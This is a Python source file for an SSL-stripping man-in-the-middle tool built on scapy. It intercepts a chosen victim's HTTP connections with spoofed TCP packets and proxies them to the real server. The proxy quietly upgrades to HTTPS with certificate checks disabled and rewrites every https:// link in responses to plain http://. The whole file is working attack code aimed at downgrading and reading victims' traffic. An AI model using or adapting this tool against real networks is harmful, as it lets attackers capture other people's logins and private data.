import socket
import ssl
import threading
import re
from scapy.layers.inet import IP, TCP
from scapy.layers.http import HTTPRequest, HTTPResponse
import scapy.all as sc

class SSLStripFilter:
    """
    A packet-level SSL stripping filter.
    Intercepts victim HTTP requests (Port 80),
    Proxies them to the server (upgrading to HTTPS if needed),
    And rewrites responses to downgrade HTTPS links to HTTP.
    """

    def __init__(self, victim_ip, logger):
        self.victim_ip = victim_ip
        self.logger = logger
        # Map (victim_port) -> { 'server_sock': socket, 'server_ip': ip, 'ssl': bool, 'seq': int, 'ack': int }
        self.sessions = {} 
    
    def __call__(self, packet):
        # Only handle TCP packets
        if not packet.haslayer(TCP):
            return False

        ip = packet[IP]
        tcp = packet[TCP]

        # Only intercept traffic going OUT from the victim
        if ip.src != self.victim_ip:
            return False

        # Intercept HTTP (Port 80)
        if tcp.dport == 80:
            return self.handle_client_packet(packet)

        return False

    def handle_client_packet(self, packet):
        ip = packet[IP]
        tcp = packet[TCP]
        victim_port = tcp.sport
        
        # 1. Handle New Connection (SYN)
        if tcp.flags == 'S':
            self.logger(f"[SSLStrip] New connection from {self.victim_ip}:{victim_port} to {ip.dst}:80")
            self.sessions[victim_port] = {
                'server_ip': ip.dst,
                'server_sock': None,
                'ssl': False,
                'victim_seq': tcp.seq + 1,
                'victim_ack': 0,
                'my_seq': 1000 # Random start
            }
            # Send SYN-ACK
            self.send_syn_ack(packet)
            return True # Packet handled, do not forward

        # 2. Handle RST / FIN / Data / ACK
        
        # Check RST (Reset)
        if tcp.flags & 0x04:
             self.handle_rst(victim_port)
             return True

        if victim_port in self.sessions:
            session = self.sessions[victim_port]
            
            # Update ACK from victim
            session['victim_ack'] = tcp.ack

            # Check FIN (Finish)
            if tcp.flags & 0x01:
                 # Check if there is data payload with the FIN
                 payload = bytes(tcp.payload)
                 if payload:
                      session['victim_seq'] += len(payload)
                      self.handle_http_request(session, payload, packet)
                 
                 self.handle_fin(packet, victim_port)
                 return True

            # If PSH or just data
            if tcp.flags & 0x18 or len(tcp.payload) > 0: # PSH or ACK handling data
                payload = bytes(tcp.payload)
                if payload:
                    # Update expected seq from victim
                    session['victim_seq'] += len(payload)
                    self.handle_http_request(session, payload, packet)
                
                # We should ACK their data
                self.send_ack(packet, session)
                return True
            
            return True # Swallow ACKs to keep connection alive locally

        return False

    def send_syn_ack(self, packet):
        ip = packet[IP]
        tcp = packet[TCP]
        session = self.sessions[tcp.sport]
        
        syn_ack = IP(src=ip.dst, dst=ip.src) / \
                  TCP(sport=tcp.dport, dport=tcp.sport, flags="SA", seq=session['my_seq'], ack=tcp.seq + 1)
        sc.send(syn_ack, verbose=0)
        session['my_seq'] += 1

    def send_ack(self, packet, session):
        ip = packet[IP]
        tcp = packet[TCP]
        ack = IP(src=ip.dst, dst=ip.src) / \
              TCP(sport=tcp.dport, dport=tcp.sport, flags="A", seq=session['my_seq'], ack=session['victim_seq'])
        sc.send(ack, verbose=0)

    def handle_http_request(self, session, payload, packet):
        # 1. Connect to server if not connected
        if not session['server_sock']:
            try:
                # Default to HTTP initially
                s = socket.create_connection((session['server_ip'], 80))
                session['server_sock'] = s
                
                # Start a thread to read from server
                t = threading.Thread(target=self.server_loop, args=(session, packet))
                t.daemon = True
                t.start()
            except Exception as e:
                self.logger(f"[SSLStrip] Failed to connect to server: {e}")
                return

        # 2. Forward Request
        try:
            # Rewrite headers to prevent compression (so we can replace text easily)
            payload = payload.replace(b"Accept-Encoding: gzip", b"Accept-Encoding: identity")
            
            # Save payload in case we need to replay it after an SSL upgrade
            session['last_request_payload'] = payload
            
            session['server_sock'].sendall(payload)
        except Exception as e:
            self.logger(f"[SSLStrip] Failed to send to server: {e}")

    def server_loop(self, session, original_packet):
        sock = session['server_sock']
        while True:
            try:
                data = sock.recv(8192)
                if not data: break
                
                # --- SSL STRIP LOGIC ---
                
                # 1. Intercept Redirects to HTTPS
                # If the server tries to redirect us to HTTPS, we intercept it.
                # Instead of telling the user to switch, WE switch to SSL, replay the request, and return the secure content as HTTP.
                if b"Location: https://" in data and not session['ssl']:
                    self.logger("[SSLStrip] Detected HTTPS Redirect! Upgrading connection to SSL...")
                    
                    try:
                        # 1. Connect to SSL Port (443)
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        raw_sock = socket.create_connection((session['server_ip'], 443))
                        ssl_sock = context.wrap_socket(raw_sock, server_hostname=session['server_ip'])
                        
                        # 2. Swap the socket in the session
                        old_sock = session['server_sock']
                        session['server_sock'] = ssl_sock
                        session['ssl'] = True
                        sock = ssl_sock # Update local variable for this loop
                        
                        # 3. Replay the original request over the encrypted channel
                        if 'last_request_payload' in session:
                            self.logger("[SSLStrip] Replaying request over SSL...")
                            sock.sendall(session['last_request_payload'])
                            
                            # Close the old plain socket
                            old_sock.close()
                            
                            # Continue the loop to read the NEW response (from the SSL socket)
                            # We discard the current 'data' which contained the 301 Redirect
                            continue
                    except Exception as e:
                        self.logger(f"[SSLStrip] SSL Upgrade Failed: {e}")
                        # Fallback: Just strip the link and hope for the best (standard behavior)
                        data = data.replace(b"Location: https://", b"Location: http://")


                # 2. Rewrite Body Links (https:// -> http://)
                # This is a naive replacement, but works for PoC
                data = data.replace(b"https://", b"http://")
                
                # -----------------------

                # Send to victim
                self.send_to_victim(session, data, original_packet)
            except Exception as e:
                self.logger(f"[SSLStrip] Server loop error: {e}")
                break
        
        # Close session
        if session['server_sock']:
            session['server_sock'].close()

    def send_to_victim(self, session, data, original_packet):
        ip = original_packet[IP]
        tcp = original_packet[TCP]
        
        # Chunking might be needed if data is large, but Scapy handles some.
        # We send PSH+ACK
        
        pkt = IP(src=ip.dst, dst=ip.src) / \
              TCP(sport=tcp.dport, dport=tcp.sport, flags="PA", seq=session['my_seq'], ack=session['victim_seq']) / \
              data
              
        sc.send(pkt, verbose=0)
        session['my_seq'] += len(data)

    def handle_rst(self, victim_port):
        if victim_port in self.sessions:
            self.logger(f"[SSLStrip] Connection reset by victim {self.victim_ip}:{victim_port}")
            session = self.sessions[victim_port]
            if session['server_sock']:
                try:
                    session['server_sock'].close()
                except:
                    pass
            del self.sessions[victim_port]

    def handle_fin(self, packet, victim_port):
        if victim_port in self.sessions:
            self.logger(f"[SSLStrip] Connection finished by victim {self.victim_ip}:{victim_port}")
            session = self.sessions[victim_port]
            
            # Acknowledge the FIN (FIN consumes 1 sequence number)
            # If payload was also processed in handle_client_packet, victim_seq is already updated for payload.
            # We add 1 for the FIN flag.
            session['victim_seq'] += 1
            
            self.send_ack(packet, session)
            
            # Close server connection
            if session['server_sock']:
                try:
                    session['server_sock'].close()
                except:
                    pass
            
            del self.sessions[victim_port]